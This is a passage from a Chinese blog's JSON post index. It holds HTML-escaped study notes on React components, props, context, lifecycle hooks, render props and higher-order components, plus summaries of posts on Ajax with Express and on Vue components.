(\u0026lt;div\u0026gt;{this.state.count}\u0026lt;/div\u0026gt;)\r}\r修改状态（状态可变）\nthis.setState({要修改的数据})\nrender(){\rreturn (\u0026lt;div onClick={()=\u0026gt;{\rthis.setState({\rcount: this.state.count + 1\r})\r}}\u0026gt;{this.state.count}\u0026lt;/div\u0026gt;)\r}\r}\r注意：不要直接修改state的值，setState的作用是先更新state，然后更新视图\nstate抽离出逻辑\n注意：箭头函数自身并不绑定this，箭头函数中this取决于外部环境\nclass Hello extends React.Component{\rstate = {\rcount: 0\r}\rmainClick(){\rthis.setState({\rcount: this.state.count + 1\r})\r}\rrender(){\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;div onClick={()=\u0026gt; this.mainClick()}\u0026gt;+1\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;{this.state.count}\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rReactDOM.render(\u0026lt;Hello /\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r解决绑定事件的this指向问题\n如果不想利用指向函数（也可以给事件函数定义为指向函数），也可以利用bind()方法，例如：\nthis.mainClick = this.mainClick.bind(this)\r受控组件（其值受到react所控制），例如：\nstate = {\rtxt: \u0026quot;\u0026quot;\r}\r\u0026lt;div\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; value={this.state.txt}\ronChange ={ e =\u0026gt; this.setState({\rtxt: e.target.value\r})}\r/\u0026gt;\r\u0026lt;div\u0026gt;\r{this.state.txt}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\rinput（text），textarea，select都是用value控制，而input（CheckBox）就用checked控制\n需要根据表单元素来判断其使用不同的类型控制（可以使用三元表达式来指示）\n如果是非受控组件，想获取属性值，通过使用React.createRef()创建ref对象，使用ref来获取，例如：\nmainClick = () =\u0026gt;{\rconsole.log(this.Ref.current.value)\r}\rconstructor(){\rsuper()\rthis.Ref = React.createRef()\r}\r\u0026lt;div\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; ref={this.Ref}/\u0026gt;\r\u0026lt;div onClick={this.mainClick}\u0026gt;\rhallo\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r深入学习React组件\n组件通讯（组件是独立并且封闭的，需要共享组件的数据，就需要组件通讯了）\n接收传递给组件的数据需要通过props，函数组件通过props参数接收，类组件通过this.props接收，例如：\nconst Hallo = props =\u0026gt;{\rconsole.log(props)\rreturn (\r\u0026lt;div\u0026gt;数据：{props.name}\u0026lt;/div\u0026gt;\r)\r}\rReactDOM.render(\u0026lt;Hallo name=\u0026quot;root\u0026quot;/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r从上面返回的props中可以看出是一个对象，也就是说可以传递多个数据\nclass Hi extends React.Component{\rrender(){\rreturn(\r\u0026lt;div\u0026gt;数据：{this.props.name}\u0026lt;/div\u0026gt;\r)\r}\r}\rReactDOM.render(\u0026lt;Hi name=\u0026quot;root\u0026quot; pass={123}/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\rprops可以传递任意类型的数据，props是只读的对象，只能读取属性的值，不能修改该对象，使用类组件，如果有构造函数，需要将其props传递给super()，通过props参数，否则无法在构造函数获取props（super(props)）\n组件的通讯有三种，分别是父对子，子对父，兄弟\n父组件传递数据给子组件：只需要在父组件中定义子组件的属性，例如：\nconst Hallo = props =\u0026gt;{\rconsole.log(props)\rreturn (\r\u0026lt;span\u0026gt;{props.name}\u0026lt;/span\u0026gt;\r)\r}\rclass Hi extends React.Component{\rstate = {\rName: \u0026quot;root\u0026quot;\r}\rrender(){\rconsole.log(this.props)\rreturn(\r\u0026lt;div\u0026gt;数据：\r\u0026lt;Hallo name={this.state.Name}/\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rReactDOM.render(\u0026lt;Hi/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r子组件传递数据给父组件\n通过回调函数，父组件提供回调，子组件调用，将数据通过回调函数的参数传递，例如：\nclass Abc extends React.Component{\rstate = {name: \u0026quot;root\u0026quot;}\rDataClick = () =\u0026gt;{\rthis.props.getMsg(this.state.name)\r}\rrender(){\rreturn (\r\u0026lt;div onClick={this.DataClick}\u0026gt;yes\u0026lt;/div\u0026gt;\r)\r}\r}\rclass Hi extends React.Component{\rstate = {\rName: \u0026quot;默认值\u0026quot;\r}\rgetDate = data =\u0026gt;{\rconsole.log(data)\rthis.setState({\rName: data\r})\r}\rrender(){\rreturn(\r\u0026lt;div\u0026gt;数据：{this.state.Name}\r\u0026lt;Abc getMsg = {this.getDate}/\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rReactDOM.render(\u0026lt;Hi/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r兄弟组件通讯\n将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态（状态提升）\n公共父组件：提供共享状态，提供操作共享状态的方法\nA组件修改共享状态，公共父组件收到新的状态，B组件通过props接收到新的状态，从而达到兄弟组件之间的通讯\n例如：\nclass Hallo extends React.Component{\rstate = {\rcount: 0\r}\ronMax = () =\u0026gt;{\rthis.setState({\rcount: this.state.count +1\r})\r}\rrender(){\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;Abc count={this.state.count}/\u0026gt;\r\u0026lt;Xyz onMax = {this.onMax}/\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rconst Abc = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\rhallo,{props.count}\r\u0026lt;/div\u0026gt;\r)\r}\rconst Xyz = (props) =\u0026gt; {\rreturn (\r\u0026lt;div onClick = {() =\u0026gt; props.onMax()}\u0026gt;\rxyz\r\u0026lt;/div\u0026gt;\r)\r}\rReactDOM.render(\u0026lt;Hallo /\u0026gt;,document.getElementById(\u0026quot;root\u0026quot;))\rContext（跨组件传递数据）\nContext实质上就是生产者-消费者模式\n调用React.createContext()，创建provide（提供数据）和consumer（获取数据）这两个组件\nconst {Provide,Consumer} = React.createContext()\n通过value属性提供数据，然后通过回调函数来获取到value的数据\n例如：\nconst {Provider,Consumer} = React.createContext()\rclass Hallo extends React.Component{\rstate = {\rcount: 0\r}\ronMax = () =\u0026gt;{\rthis.setState({\rcount: this.state.count +1\r})\r}\rrender(){\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;Provider value = \u0026quot;react\u0026quot;\u0026gt;\r\u0026lt;Abc /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rconst Abc = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;Consumer\u0026gt;\r{\rdata =\u0026gt; \u0026lt;div\u0026gt;hallo,{data}\u0026lt;/div\u0026gt;\r}\r\u0026lt;/Consumer\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rprops深入学习\nchildren属性：表示组件标签的子节点，当组件标签有子节点时，props就会拥有该属性\nchildren属性值可以是任意值（文本，jsx，组件，函数等等）\nchildren属性指向到当前子节点的数据，{props.children}，例如：\nconst Button = () =\u0026gt; (\r\u0026lt;button\u0026gt;\r我是一个button组件\r\u0026lt;/button\u0026gt;\r)\rconst Yes = (props) =\u0026gt;{\rreturn(\r\u0026lt;div\u0026gt;\r组件的子节点：{props.children}\r\u0026lt;/div\u0026gt;\r)\r}\rReactDOM.render(\u0026lt;Yes\u0026gt;\u0026lt;Button/\u0026gt;\u0026lt;/Yes\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\rprops校验（保证组件传入指定合法格式的数据）\n安装prop-types\nyarn add prop-types\n导入prop-types包并且建立个props校验实例\nimport propTypes from \u0026quot;prop-types\u0026quot;\rclass Noabc extends React.Component{\rrender(){\rreturn(\r\u0026lt;div\u0026gt;hallo,{this.props.name}\u0026lt;/div\u0026gt;\r)\r}\r}\rNoabc.propTypes = {\rname: propTypes.string\r}\rReactDOM.render(\u0026lt;Noabc name=\u0026quot;react\u0026quot;/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r当传入的值的类型不对，将抛出错误\nprops默认值\n给props设置默认值，在未传入props时生效\nclass Defaultabc extends React.Component{\rrender(){\rreturn(\r\u0026lt;div\u0026gt;props的默认值：{this.props.Defaultdata}\u0026lt;/div\u0026gt;\r)\r}\r}\rDefaultabc.defaultProps = {\rDefaultdata: 999\r}\rReactDOM.render(\u0026lt;Defaultabc/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r单向数据流：指的是当前组件的state以props的形式流动时，只能流向组件树中比自己层级低的组件，不能向上流，也就是说可父传子，祖先传后辈，但是不能子传父\n父传子通信，基于数据流单向的特性，父组件可以直接将this.props传入子组件中\n子传父通信，因为数据流单向的特性，不能直接将数据传递给父组件，而是通过父组件传递子组件一个携带了上下文的函数，子组件得到这个函数后，传递给父组件的数据将以函数参数的形式发送回去\n兄弟通信，利用父传子通信的特性，可以在两个兄弟组件之上创建一个父组件，来当中间件，实质上还是父传子通信\n消息订阅与发布机制是组件通信的万金油，这边使用的是PubSubjs\n安装\nnpm i pubsub-js\n引入\nimport PubSub from \u0026lsquo;pubsub-js\u0026rsquo;\n只需要在父组件（祖先组件）中发布，然后在子组件（后辈组件）中订阅，就可以实现了\n发布\nPubSub.publish(\u0026rsquo;test\u0026rsquo;,\u0026lsquo;hallo word\u0026rsquo;)\n发布信息实质是就是发送数据\n订阅\nconst DataMain = PubSub.subscribe(\u0026rsquo;test\u0026rsquo;,data)\n其中data就是\u0026rsquo;hallo word\u0026rsquo;的数据，订阅是获取发布的数据\n取消订阅\nPubSub.unsubscribe(DataMain)\n组件的生命周期\n组件的生命周期有利于掌握组件的运行方式，实现更复杂的组件功能，分析组件错误原因\n生命周期：被创建，到挂载页面，卸载组件的过程\n生命周期的每个阶段都可以伴随一些方法来调用，而这些方法就是生命周期的钩子函数（和vue的生命周期概念是一样的）\n注意：只有类组件才有生命周期，函数组件没有\n创建时：当组件被创建时（页面加载时），constructor() -\u0026gt; render() -\u0026gt; componentDidMount()\n例如：\nclass Defaultabc extends React.Component{\rconstructor(props){\rsuper(props)\rconsole.log(\u0026quot;constructor钩子被触发\u0026quot;)\r}\rcomponentDidMount(){\rconsole.log(\u0026quot;componentDidMount钩子被触发\u0026quot;)\r}\rrender(){\rconsole.log(\u0026quot;render钩子被触发\u0026quot;)\rreturn(\r\u0026lt;div\u0026gt;hallo react\u0026lt;/div\u0026gt;\r)\r}\r}\rconstructor钩子在创建组件时触发，初始化state，为事件程序绑定this\nrender钩子在组件渲染时触发，渲染视图，注意：不要在render下使用setState方法\ncomponentDidMount钩子在组件被挂载后触发（完成DOM渲染），发送网络请求，DOM操作\n更新时：\n当一个组件接收到新属性（new props）时，使用setState()，强制更新forceUpdate()都会触发重新渲染\n例如：\nclass Maxabc extends React.Component{\rconstructor(props){\rsuper(props)\rthis.state = {\rcount: 0\r}\r}\rgoClick = () =\u0026gt;{\rthis.setState({\rcount: this.state.count + 1\r})\r}\rcomponentDidUpdate(){\rconsole.log(\u0026quot;componentDidUpdate钩子触发\u0026quot;)\r}\rrender(){\rconsole.log(\u0026quot;reder钩子被触发\u0026quot;)\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;hallo,{this.state.count}\u0026lt;/div\u0026gt;\r\u0026lt;button onClick={this.goClick}\u0026gt;go\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rReactDOM.render(\u0026lt;Maxabc/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r在这个实例可以看出，只要使用setState方法改变了数据，就会重新渲染组件，同时如果没有更新，就不触发componentDidUpdate钩子，当发生更新才会触发\ncomponentDidUpdate钩子：发生网络请求，DOM操作，注意：如果需要setState()，需要放在一个if条件中，传入prevProp参数，获取上一次更新的props，this.props可以获取到当前的props\n例如：\ncomponentDidUpdate(prevProp){\rconsole.log(\u0026quot;componentDidUpdate钩子触发\u0026quot;)\rif(prevProp.count !== this.props.count){\rthis.setState({})\r}\r}\r判断条件为更新前的props是否和当前的props不相等\n卸载时：当组件从页面中卸载时\ncomponentWillUnmount钩子：当组件被卸载时触发，可以用来执行清理工作等等\n例如：\nclass Maxabc extends React.Component{\rcomponentDidUpdate(prevProp){\rconsole.log(\u0026quot;componentDidUpdate钩子触发\u0026quot;)\rif(prevProp.count !== this.props.count){\rthis.setState({})\r}\r}\rconstructor(props){\rsuper(props)\rthis.state = {\rcount: 0\r}\r}\rgoClick = () =\u0026gt;{\rthis.setState({\rcount: this.state.count + 1\r})\r}\rrender(){\rconsole.log(\u0026quot;reder钩子被触发\u0026quot;)\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;\r点击数：{this.state.count}\r\u0026lt;/p\u0026gt;\r{\rthis.state.count \u0026gt;= 10 ? \u0026lt;p\u0026gt;已经点击了10次\u0026lt;/p\u0026gt; : \u0026lt;Gabc/\u0026gt;\r}\r\u0026lt;button onClick={this.goClick}\u0026gt;go\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rclass Gabc extends React.Component{\rrender(){\rreturn(\r\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;\r)\r}\rcomponentWillUnmount(){\rconsole.log(\u0026quot;componentWillUnmount钩子被触发\u0026quot;)\r}\r}\rReactDOM.render(\u0026lt;Maxabc/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r清理（例如定时器），例如：\nclass Gabc extends React.Component{\rcomponentDidMount(){\rthis.timeId = setInterval(()=\u0026gt;{\rconsole.log(\u0026quot;定时器执行中\u0026quot;)\r},1000)\r}\rrender(){\rreturn(\r\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;\r)\r}\rcomponentWillUnmount(){\rconsole.log(\u0026quot;componentWillUnmount钩子被触发\u0026quot;)\rclearInterval(this.timeId)\r}\r}\r当卸载事件发生，就执行清除定时器，使用clearInterval()方法清除\n注意：如果创建了一些不是组件本身的事件（例如定时器），一定要在组件被卸载的时候清除，避免一些奇怪的问题发生\nrender-props和高阶组件（HOC）\n复用相似功能（复用状态state，组件状态的逻辑）\nrender-props模式\n将复用状态state，组件状态的逻辑封装到一个组件中\n添加一个值为函数的prop，通过函数参数来获取，通过该函数的返回值作为要渲染的内容\n将复用的状态作为props.render(state)方法的参数，暴露到组件的外部\n例如：\nclass Hello extends React.Component{\rstate = {\rx: 0,\ry: 0\r}\ryesClick = (e) =\u0026gt;{\rthis.setState({\rx: e.clientX,\ry: e.clientY\r})\r}\rcomponentDidMount(){\rwindow.addEventListener(\u0026quot;mousemove\u0026quot;,this.yesClick)\r}\rrender(){\rreturn this.props.render(this.state)\r}\r}\rclass App extends React.Component{\rrender(){\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;\r\u0026lt;Hello render = {(mouse) =\u0026gt;{\rreturn(\r\u0026lt;p\u0026gt;\r鼠标坐标：{mouse.x},{mouse.y}\r\u0026lt;/p\u0026gt;\r)\r}}/\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\r也可以使用children代替render属性，例如：\nclass Hello extends React.Component{\rstate = {\rx: 0,\ry: 0\r}\ryesClick = (e) =\u0026gt;{\rthis.setState({\rx: e.clientX,\ry: e.clientY\r})\r}\rcomponentDidMount(){\rwindow.addEventListener(\u0026quot;mousemove\u0026quot;,this.yesClick)\r}\rrender(){\rreturn this.props.children(this.state)\r}\r}\rclass App extends React.Component{\rrender(){\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;\r\u0026lt;Hello\u0026gt;\r{\rmouse =\u0026gt;{\rreturn(\r\u0026lt;p\u0026gt;\r鼠标坐标：{mouse.x},{mouse.y}\r\u0026lt;/p\u0026gt;\r)\r}\r}\r\u0026lt;/Hello\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rReactDOM.render(\u0026lt;App/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r可以给render props模式加props校验\n应该在组件卸载时解除mousemove事件绑定（只要不是react的事件，都应该进行清除其他事件，例如window事件）\ncomponentWillUnmount(){\rwindow.removeEventListener(\u0026quot;mousemove\u0026quot;,this.handleMouseMove)\r}\r高阶组件\n高阶组件（HOC，Higher-Order Component），实质上就是一个函数，接收要包装的组件，返回增强后的组件\n高阶组件实质上就是给组件进行“包装”，通过“包装”来增强组件的功能\n高阶组件内部会创建一个类组件，在这个类组件中提供状态逻辑程序，通过prop将复用状态传递给被包装组件\n创建函数，函数名一般是with开头，函数参数是要渲染的组件，因此参数是大写字母开头\n在该函数中创建个类组件，提供复用的状态逻辑程序，状态通过prop传递给参数组件\n例如：\nconst withHallo = (DemoAbc) =\u0026gt;{\rreturn class App extends React.Component{\rstate = {\rx: 0,\ry: 0\r}\ronAbc = (e) =\u0026gt;{\rthis.setState({\rx: e.clientX,\ry: e.clientY\r})\r}\rrender() {\rreturn (\r\u0026lt;div onMouseMove= {this.onAbc}\u0026gt;\r\u0026lt;DemoAbc {...this.props} mouse={this.state}/\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rcomponentDidMount(){\rwindow.addEventListener(\u0026quot;mousemove\u0026quot;,this.onAbc)\r}\r// eslint-disable-next-line react/no-typos\rcomponentWillunmount(){\rwindow.removeEventListener(\u0026quot;mousemove\u0026quot;,this.onAbc)\r}\r}\r}\rconst PostMax = (props) =\u0026gt;{\rconst { x, y } = props.mouse\rreturn (\r\u0026lt;div \u0026gt;\r\u0026lt;p\u0026gt;(x:{x}, y:{y})\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r) }\rconst Demoyes = withHallo(PostMax)\rReactDOM.render(\u0026lt;Demoyes /\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r可以从上面的实例看出，实质上就是通过函数参数方式接收一个组件，再返回一个新的组件，达到“包装”更多的功能给组件\n使用高阶组件会导致获得的组件名称相同，名称取自于高阶组件中的类组件名称\n通过设置displayName，来区分不同的组件，displayName是用来设置调试信息（react developer tools消息）的\n可以通过react developer tools浏览器插件查看效果\n通过给高阶组件中的类组件设置displayName，例如：\nconst withHallo = (DemoAbc) =\u0026gt;{\rclass App extends React.Component{\r......\r}\rApp.displayName = `WithHallo${ADisplayName(DemoAbc)}`\rreturn App\r}\rfunction ADisplayName(DemoAbc){\rreturn DemoAbc.displayName || DemoAbc.name || \u0026quot;Component\u0026quot;\r}\r传递props（避免props丢失）\n通过高阶组件返回的组件中，是获取不到props的，因为数据都传递给高阶组件中的类组件了（高阶组件没有往下传递props）\n只需要将state和this.props一起传递就可以解决，例如：\nrender() {\rreturn (\r\u0026lt;div onMouseMove= {this.onAbc}\u0026gt;\r\u0026lt;DemoAbc {...this.state} {...this.props} mouse={this.state}\u0026gt;\u0026lt;/DemoAbc\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst PostMax = (props) =\u0026gt;{\rconst { x, y } = props.mouse\r// eslint-disable-next-line no-undef\rconsole.log(props)\rreturn (\r\u0026lt;div \u0026gt;\r\u0026lt;p\u0026gt;(x:{x}, y:{y})\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r) }\rconst Demoyes = withHallo(PostMax)\rReactDOM.render(\u0026lt;Demoyes a=\u0026quot;hallo\u0026quot;/\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r通过上面的方法向下传递props就能获取到a的值了， {\u0026hellip;this.state} {\u0026hellip;this.props}\n","permalink":"https://99999.fun/posts/55/","summary":"React是构造用户界面的JavaScript库，就是负责视图层的，只负责视图的渲染，其特点是声明式，组件化\n安装react\nnpm i react react-dom\n必需：react和react-dom\nreact包是提供创建元素，组件等功能，是核心（废话）\nreact-dom包提供DOM相关的功能\n通常还需要导入babel来解析jsx（注意：在浏览器使用babel编译jsx效率很低，babel内嵌了对于jsx的支持），babel可以将es6语法转化为es5，方便运行在不支持es6的浏览器上\n也可以通过引入src文件的方式引入cdn文件或者本地文件\n第一个例子\n\u0026lt;script type=\u0026quot;text/babel\u0026quot;\u0026gt;\rReactDOM.render(\r\u0026lt;h1\u0026gt;hallo,react!!!\u0026lt;/h1\u0026gt;,\rdocument.getElementById(\u0026quot;app\u0026quot;)\r);\r\u0026lt;/script\u0026gt;\r使用babel解析jsx，react官方推荐使用jsx，因为使用jsx渲染dom简单明了\njsx是一种JavaScript语法扩展，例如：\nconst hallo = \u0026lt;h1\u0026gt;hallo\u0026lt;/h1\u0026gt;;\r像上面这种就是jsx，jsx本身是一个表达式，经过编译（例如babel）后jsx表达式会转换成JavaScript对象（注意：jsx不是标准的ECMAScript语法，是语法的扩展，不进行编译处理，直接使用是会报错的）\n在jsx中插入JavaScript表达式，用大括号包含起来，例如：\nfunction hallo(yes){\rreturn yes.name;\r}\rconst yes = {\rname: \u0026quot;react\u0026quot;\r};\rconst hallo = \u0026lt;h1\u0026gt;hallo,{hallo(yes)}\u0026lt;/h1\u0026gt;;\rReactDOM.render(\rhallo,\rdocument.getElementById(\u0026quot;app\u0026quot;)\r);\r当然react并没有强制要求必须使用jsx，例如：\nconst hallo = React.createElement(\u0026quot;h1\u0026quot;,{class: \u0026quot;main\u0026quot;},React.createElement(\u0026quot;p\u0026quot;,null,\u0026quot;hallo word!!!\u0026quot;))\r/* 上面提供了三个参数，分别是元素名称，元素属性，元素的子节点 */\rReactDOM.render(hallo,document.getElementById(\u0026quot;app\u0026quot;))\r/* 上面提供了个两个参数，分别是要渲染的react元素，挂载点*/\rreact脚手架\n初始化项目\nnpx create-react-app app\n启动项目（在项目根目录执行）\nnpm start或者yarn start\n模块化导入react","title":"React学习笔记"},{"content":"ajax是浏览器提供的一套方法，可以实现页面无刷新更新数据\n关于XMLHttpRequest对象（构造函数）的用法：https://xiaochenabc123.test.com/archives/14.html\najax需要网站环境下生效，需要web服务器，nodemon\napp.js\n// 导入express\rconst express = require(\u0026quot;express\u0026quot;);\r// 导入path\rconst patg = require(\u0026quot;path\u0026quot;);\r// 创建web服务器\rconst app = express();\r// 静态资源访问服务\rapp.use(express.static(path.join(__dirname,\u0026quot;public\u0026quot;)));\rapp.get(\u0026quot;/hallo\u0026quot;,(req, res) = \u0026gt;{\rres.send(\u0026quot;hallo\u0026quot;);\r});\r// 监听端口\rapp.listen(3000);\rconsole.log(\u0026quot;服务器启动成功\u0026quot;)\rnodemon app.js\najax运行原理\najax代理浏览器发送请求和接收响应，达到局部更新页面数据的效果\n创建ajax对象\nvar hallo = new XMLHttpRequest();\n请求方式和请求地址\nhallo.open(\u0026ldquo;GET\u0026rdquo;,\u0026ldquo;https://httpbin.org/get\u0026quot;)\n发送请求\nhallo.send();\n获取服务端给予客户端的响应数据，因为请求和获取数据的速度取决于网络速度，应该设置onload事件，当加载完毕了再获取数据\nhallo.onload = function(){\rconsole.log(hallo.responseText)\r}\r服务端大部分情况下用json对象作为响应数据的格式，通过拼接json数据和html，将拼接的结果显示在页面中\n在http请求与响应的过程中，请求参数或者响应内容，如果是对象类型，最后都会转换为对象字符串进行传输，例如：\napp.get(\u0026quot;/hallo\u0026quot;,(req, res) = \u0026gt;{\rres.send({\u0026quot;name\u0026quot; : \u0026quot;root\u0026quot;});\r});\rjson字符串转换为json对象\nvar responseText = JSON.parse(hallo.responseText);\rconsole.log(responseText)\rvar str = \u0026quot;\u0026lt;div\u0026gt;\u0026quot;+ responseText.name +\u0026quot;\u0026lt;/div\u0026gt;\u0026quot;;\rdocument.body.innerHTML = str;\r请求参数传递\nget请求\nhallo.open(\u0026ldquo;get\u0026rdquo;,\u0026ldquo;https://httpbin.org/get?name=hallo\u0026amp;pass=123\u0026quot;)\nvar hallo = \u0026ldquo;name=\u0026quot;+ names + \u0026ldquo;\u0026amp;pass=\u0026rdquo; + pass\n表单的数据获取\nhallo.value\npost请求参数\npost请求参数是保存到请求头中的报文，不像get是通过链接参数传输的\nhallo.setRequestHeader(\u0026ldquo;Content-Type\u0026rdquo;,\u0026ldquo;application/x-www-forn-urlencoded\u0026rdquo;)\nhallo.send(\u0026ldquo;name=root\u0026amp;pass=123\u0026rdquo;)\npost请求必须设置请求参数格式的类型\npost请求需要body-parser模块\nconst bodyParser = require(\u0026ldquo;body-parser\u0026rdquo;)\njson\nContent-Type属性：application/json\n{name: \u0026ldquo;root\u0026rdquo;,\u0026ldquo;pass\u0026rdquo;: \u0026ldquo;123\u0026rdquo;}\n将json对象转换为json字符串\nJSON.stringify()\najax错误处理\n获取http状态码\nhallo.status()\n","permalink":"https://99999.fun/posts/54/","summary":"ajax是浏览器提供的一套方法，可以实现页面无刷新更新数据\n关于XMLHttpRequest对象（构造函数）的用法：https://xiaochenabc123.test.com/archives/14.html\najax需要网站环境下生效，需要web服务器，nodemon\napp.js\n// 导入express\rconst express = require(\u0026quot;express\u0026quot;);\r// 导入path\rconst patg = require(\u0026quot;path\u0026quot;);\r// 创建web服务器\rconst app = express();\r// 静态资源访问服务\rapp.use(express.static(path.join(__dirname,\u0026quot;public\u0026quot;)));\rapp.get(\u0026quot;/hallo\u0026quot;,(req, res) = \u0026gt;{\rres.send(\u0026quot;hallo\u0026quot;);\r});\r// 监听端口\rapp.listen(3000);\rconsole.log(\u0026quot;服务器启动成功\u0026quot;)\rnodemon app.js\najax运行原理\najax代理浏览器发送请求和接收响应，达到局部更新页面数据的效果\n创建ajax对象\nvar hallo = new XMLHttpRequest();\n请求方式和请求地址\nhallo.open(\u0026ldquo;GET\u0026rdquo;,\u0026ldquo;https://httpbin.org/get\u0026quot;)\n发送请求\nhallo.send();\n获取服务端给予客户端的响应数据，因为请求和获取数据的速度取决于网络速度，应该设置onload事件，当加载完毕了再获取数据\nhallo.onload = function(){\rconsole.log(hallo.responseText)\r}\r服务端大部分情况下用json对象作为响应数据的格式，通过拼接json数据和html，将拼接的结果显示在页面中\n在http请求与响应的过程中，请求参数或者响应内容，如果是对象类型，最后都会转换为对象字符串进行传输，例如：\napp.get(\u0026quot;/hallo\u0026quot;,(req, res) = \u0026gt;{\rres.send({\u0026quot;name\u0026quot; : \u0026quot;root\u0026quot;});\r});\rjson字符串转换为json对象\nvar responseText = JSON.parse(hallo.responseText);\rconsole.","title":"Ajax学习笔记"},{"content":"组件注册\n.component()接收2个参数，其中第一个参数是组件名（数据类型是字符串）\n组件名命名：\n全部小写，多个单词用连字符连接（-减号）\n因为html中是大小写不敏感的，浏览器会将大写解析为小写，因此不要使用驼峰命名法来命名自定义标签，而是使用连字符分隔\n组件被引用时，也必须是相同的名，例如：组件名是img-data，那么被引用时标签为，闭不闭合看组件的定义，如果组件的定义是img之类的，就不需要闭合\n直接暴露在vue实例的组件都是全局组件，可以直接在组件实例中调用\n局部组件是使用一个JavaScript对象进行定义封装，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;datas-a\u0026gt;\u0026lt;/datas-a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst datas ={\rtemplate: `\r\u0026lt;div\u0026gt;\rhallo\r\u0026lt;/div\u0026gt;\r`\r}\rconst hallo = Vue.createApp({\rcomponents: {\r\u0026quot;datas-a\u0026quot; : datas\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\rcomponents对象，键为自定义元素的名称，值为组件的实质对象\n局部组件的属性是不能直接被调用的，但是可以在另一个组件中指向其为自己的子组件，例如：\nconst datab ={\rcomponents: {\r\u0026quot;datas-a\u0026quot; : dataa\r}\r}\r模块系统\n通过导入模块的方式导入组件，例如：\nimport datas from \u0026lsquo;./datas\u0026rsquo;\n那么datas组件就是可以在当前使用了\nProps\nprop类型\n用对象的方式列出prop，并且定义其类型，当传入的prop类型不对就会报错（开发版本），例如：\nconst hallo = Vue.createApp({\rcomponent: {\rprops:{\rabc: String,\rxyz: Boolean,\r},\rtemplate: `\u0026lt;h1\u0026gt;{{abc.text}}-{{xyz.text}}\u0026lt;h1\u0026gt;`\r}\r}).mount('#app')\r如果没有限制类型，那么任何类型的值（能装进变量里的值都行，因为连变量里面的值都可以传入）都可以传给prop\n传入数字\n传入布尔值\n传入数组\n传入对象\n单向数据流\n父组件的prop数据可以流向子组件，但是子组件不能流向父组件，避免因为子组件而修改了父组件\n父组件发生变化时，子组件的prop都会刷新为当前最新的值\n属性继承\n可以在组件中写属性，例如：\ntemplate: \\`\u0026lt;div class=\u0026quot;main\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\\`\r同样也是可以在组件写事件监听器之类的\n禁用属性继承\ninheritAttrs: false,\rtemplate: \\`\u0026lt;div class=\u0026quot;main\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\\`\r包含未被props接收的参数\nthis.$attrs\n可以根据需求来传入属性，例如：\n\u0026lt;test class=\u0026quot;data\u0026quot;\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;div :class=\u0026quot;$attrs.class\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r父子组件之间通过事件进行通信\nvue实质上是单向数据流，子组件不能修改父组件传递的数据，不过可以通过事件来进行修改，props传递数据：只能父传子，而不能子传父\n因此vue提供了自定义事件来先父组件传递数据，然后父组件监听子组件的事件\n自定义事件\n如果定义了原生事件，那么组件的事件将会代替原生事件\nemits选项可以定义事件\n兄弟（非父子）组件数据交互\n通过一个事件中心（实质上这是一个发布-订阅模型）来管理组件间的通信\n这个事件中心叫Vue事件总线（EventBus）\nlet hallo = new Vue()\n监听事件和销毁事件\nhallo.$on(\u0026ldquo;onadd\u0026rdquo;, 